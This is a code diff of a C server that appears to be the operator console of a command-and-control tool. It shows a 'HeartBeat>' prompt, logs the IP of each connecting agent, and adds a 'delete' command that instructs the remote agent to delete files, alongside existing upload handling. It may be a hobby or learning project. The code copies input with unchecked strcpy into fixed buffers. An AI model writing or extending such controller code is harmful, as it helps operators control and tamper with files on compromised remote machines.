@@ -59,16 +59,22 @@ int main(void){
 		exit(EXIT_FAILURE);
 	}
 	printf("[+] listening on port %d...\n",PORT_NO);
+	printf("HeartBeat> ");
 
 	int client_socket = 0;
+	struct sockaddr_in *peer_address = malloc(sizeof(struct sockaddr_in));
+	socklen_t peer_addr_len = sizeof(*peer_address);
 	while (1){
 	//accepting connections
-		client_socket=accept(server_socket, NULL, NULL);
+		client_socket=accept(server_socket, (struct sockaddr *)peer_address, (socklen_t *) &peer_addr_len);
 		if (client_socket == -1){
 			perror("[x] accept() failed\n[x]exiting...\n");
 			exit(EXIT_FAILURE);
 		}
-		printf("[+] connection received...\n");
+
+		char peer_ip[BUFFER_SIZE];
+		inet_ntop(AF_INET,&(peer_address->sin_addr), peer_ip,sizeof(peer_ip));
+		printf("\n[+] connection received from %s...\n",peer_ip);
 		//recv msg from agent
 		// should recv basic sysinfo with password to complete auth
 		char recv_buf[BUFFER_SIZE] = {0};
@@ -86,7 +92,7 @@ int main(void){
 		else {break;}
 		
 	}
-	printf("[+] goin to second loop\n");
+	//printf("[+] goin to second loop\n");
 	ssize_t sent_bytes = 0;
 	ssize_t bytes_received = 0;
 	char cmd[BUFFER_SIZE] = {0};
@@ -94,7 +100,6 @@ int main(void){
 	while (1){
 		//recv msg from agent
 		// should recv basic sysinfo with password to complete auth
-		
 		printf("HeartBeat> ");
 		fgets(cmd,BUFFER_SIZE,stdin);
 		cmd[strcspn(cmd, "\n")] = '\0';
@@ -123,11 +128,9 @@ int main(void){
 			if (space_pos_upload == NULL) {
 				continue;
 			}
-			printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
+			//printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
 			// 
 			// will use basename() to get the filename to write with linux fs bullshit
-			
-
 
 			char remainder_copy[1024];
 			strcpy(remainder_copy, space_pos_upload + 1);
@@ -171,9 +174,34 @@ int main(void){
 			continue;
 		}
 
+		else if ( strncmp(cmd,"delete",6) == 0){
+			
+			// Parse the buffer
+			char cmd_copy[BUFFER_SIZE];
+			strcpy(cmd_copy,cmd);
+			char* space_pos_delete = strchr(cmd_copy, ' ');
+			if (space_pos_delete == NULL) {
+				continue;
+			}
+			printf("[+] cmd = %s\ncmd_copy=%s\n", cmd, cmd_copy);		//DEBUG
+
+			char remainder_copy[1024];
+			strcpy(remainder_copy, space_pos_delete + 1);
+
+			// First token is the filename
+			char * FileNameToDelete = remainder_copy;
+			if (FileNameToDelete == NULL) {
+			    perror("[x] Missing filename");
+			    continue;
+			}
+			//printf("[+] File to delete will be %s\n",FileNameToDelete);	//DEBUG
+			DeleteRequestedFile(cmd, client_socket, FileNameToDelete);
+			continue;
+		}
+
 		else if ( strcmp(cmd,"exit") == 0){
 			printf("This should exit\n");
-			continue;
+			break;
 			
 		}
 		else{
@@ -199,6 +227,10 @@ int main(void){
 
 	//free memory
 	free(server_address);
+	free(peer_address);
+	close(client_socket);
+	close(server_socket);
+
 
 	return 0;
 
